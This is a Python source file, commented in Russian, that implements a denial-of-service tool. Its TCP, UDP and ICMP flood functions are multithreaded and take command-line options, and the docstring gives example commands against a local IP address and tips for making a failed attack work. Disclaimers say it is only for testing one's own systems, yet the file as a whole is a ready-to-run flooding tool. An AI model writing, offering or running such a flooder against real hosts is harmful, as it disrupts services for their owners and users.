#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
ПРОСТОЙ СКРИПТ ДЛЯ DOS-АТАКИ (НЕ ИСПОЛЬЗОВАТЬ НА РЕАЛЬНЫХ ЦЕЛЯХ!)
==================================================================

КАК ПОЛЬЗОВАТЬСЯ ЭТИМ СКРИПТОМ:
------------------------------

1. Этот скрипт предназначен ТОЛЬКО для тестирования ваших собственных систем.
   НИКОГДА не используйте его для атаки на чужие системы - это незаконно!

2. Запуск в командной строке или PowerShell:
   ----------------------------------------
   
   Windows: py -3 dos.py -t IP_АДРЕС_ЦЕЛИ -p ПОРТ -a ТИП_АТАКИ -d ВРЕМЯ -c СОЕДИНЕНИЯ
   Linux/Mac: python3 dos.py -t IP_АДРЕС_ЦЕЛИ -p ПОРТ -a ТИП_АТАКИ -d ВРЕМЯ -c СОЕДИНЕНИЯ

3. ПРИМЕРЫ КОМАНД:
   -------------
   
   # TCP-атака на порт 80 (веб-сервер) в течение 10 секунд с 2 соединениями:
   py -3 dos.py -t 192.168.100.16 -p 80 -a tcp -d 10 -c 2
   
   # UDP-атака на порт 53 (DNS) в течение 15 секунд с 3 соединениями:
   py -3 dos.py -t 192.168.100.16 -p 53 -a udp -d 15 -c 3
   
   # ICMP-атака (ping) в течение 20 секунд:
   py -3 dos.py -t 192.168.100.16 -a icmp -d 20 -c 1

4. ПАРАМЕТРЫ КОМАНДЫ:
   ----------------
   
   -t, --target     : IP-адрес цели (обязательный параметр)
   -p, --port       : Порт для атаки (по умолчанию 80)
   -a, --attack     : Тип атаки: tcp, udp или icmp (по умолчанию tcp)
   -d, --duration   : Сколько секунд будет идти атака (по умолчанию 60)
   -c, --connections: Сколько одновременных соединений (по умолчанию 1)

5. ВАЖНО:
   -----
   
   * Для ICMP-атаки требуются права администратора/root
   * Если атака неудачна, проверьте:
     - Правильно ли указан IP-адрес
     - Открыт ли указанный порт на целевой машине
     - Не блокирует ли ваш брандмауэр исходящие соединения
"""

import socket
import threading
import random
import time
import argparse
from datetime import datetime

def print_status(sent, target):
    """Выводит на экран информацию о количестве отправленных пакетов"""
    print(f"[{datetime.now().strftime('%H:%M:%S')}] Отправлено {sent} пакетов на {target}")

def dos_attack(target_ip, target_port, attack_type="tcp", duration=60):
    """
    Выполняет DOS-атаку на указанный IP-адрес
    
    Параметры:
    target_ip - IP-адрес цели
    target_port - порт на целевой машине
    attack_type - тип атаки (tcp, udp, icmp)
    duration - продолжительность атаки в секундах
    """
    total_packets = 0
    successful_packets = 0
    failed_packets = 0
    
    # Определим время окончания атаки
    end_time = time.time() + duration
    
    print(f"Начало DOS-атаки на {target_ip}:{target_port} используя {attack_type.upper()}")
    
    try:
        while time.time() < end_time:
            if attack_type.lower() == "tcp":
                # TCP атака
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                try:
                    s.connect((target_ip, target_port))
                    s.send(b"X" * random.randint(1024, 2048))
                    total_packets += 1
                    successful_packets += 1
                except socket.timeout:
                    total_packets += 1
                    failed_packets += 1
                    if failed_packets % 10 == 0:
                        print(f"Соединение с {target_ip}:{target_port} не удалось (таймаут)")
                except socket.error as e:
                    total_packets += 1
                    failed_packets += 1
                    if failed_packets % 10 == 0:
                        print(f"Ошибка соединения с {target_ip}:{target_port}: {e}")
                finally:
                    s.close()
            
            elif attack_type.lower() == "udp":
                # UDP атака
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = b"X" * random.randint(1024, 65500)
                try:
                    s.sendto(data, (target_ip, target_port))
                    total_packets += 1
                    successful_packets += 1
                except socket.error as e:
                    total_packets += 1
                    failed_packets += 1
                    if failed_packets % 10 == 0:
                        print(f"Ошибка отправки UDP пакета на {target_ip}:{target_port}: {e}")
                finally:
                    s.close()
            
            elif attack_type.lower() == "icmp":
                # ICMP flood (ping)
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    s.sendto(b"X" * 56, (target_ip, 0))
                    total_packets += 1
                    successful_packets += 1
                except PermissionError:
                    print("ICMP атака требует прав администратора")
                    print("Запустите скрипт от имени администратора (с правами админа):")
                    print("В Windows: Правый клик на командной строке -> Запуск от имени администратора")
                    print("В Linux/Mac: sudo python3 dos.py ...")
                    return
                except socket.error as e:
                    total_packets += 1
                    failed_packets += 1
                    if failed_packets % 10 == 0:
                        print(f"Ошибка отправки ICMP пакета на {target_ip}: {e}")
                finally:
                    s.close()
            
            # Выводим статус каждые 100 пакетов или каждые 5 секунд
            if total_packets % 100 == 0 or (total_packets > 0 and time.time() % 5 < 0.1):
                print_status(total_packets, f"{target_ip}:{target_port} (успешно: {successful_packets}, неудачно: {failed_packets})")
                
            # Небольшая задержка для уменьшения нагрузки на систему
            time.sleep(0.01)
    
    except KeyboardInterrupt:
        print("Атака остановлена пользователем (нажатием Ctrl+C)")
    
    print(f"Атака завершена. Всего отправлено {total_packets} пакетов (успешно: {successful_packets}, неудачно: {failed_packets})")

# Если скрипт запущен напрямую (а не импортирован)
if __name__ == "__main__":
    # Создаем парсер аргументов командной строки
    parser = argparse.ArgumentParser(description="Простой скрипт DOS-атаки для тестирования систем обнаружения вторжений")
    
    # Добавляем аргументы
    parser.add_argument("-t", "--target", required=True, help="Целевой IP-адрес")
    parser.add_argument("-p", "--port", type=int, default=80, help="Целевой порт (по умолчанию 80)")
    parser.add_argument("-a", "--attack", choices=["tcp", "udp", "icmp"], default="tcp", help="Тип атаки (tcp, udp, icmp)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Продолжительность атаки в секундах (по умолчанию 60)")
    parser.add_argument("-c", "--connections", type=int, default=1, help="Количество одновременных соединений (по умолчанию 1)")

    # Разбираем аргументы
    args = parser.parse_args()
    
    # Проверяем соединения и предупреждаем пользователя
    if args.connections > 10:
        print(f"ВНИМАНИЕ: Вы запускаете {args.connections} потоков. Это может привести к высокой нагрузке на вашу систему.")
        input("Нажмите Enter для продолжения или Ctrl+C для отмены...")
    
    # Выводим информацию о запущенной атаке
    print(f"==================================================")
    print(f"Запуск DOS-атаки со следующими параметрами:")
    print(f"Цель: {args.target}")
    print(f"Порт: {args.port}")
    print(f"Тип атаки: {args.attack}")
    print(f"Продолжительность: {args.duration} секунд")
    print(f"Соединения: {args.connections}")
    print(f"==================================================")
    print(f"[ПРЕДУПРЕЖДЕНИЕ] Используйте только для тестирования своих систем!")
    print(f"==================================================")
    
    # Запускаем несколько потоков для большей нагрузки
    threads = []
    for i in range(args.connections):
        t = threading.Thread(target=dos_attack, args=(args.target, args.port, args.attack, args.duration))
        threads.append(t)
        t.start()
    
    # Ждем завершения всех потоков
    for t in threads:
        t.join() 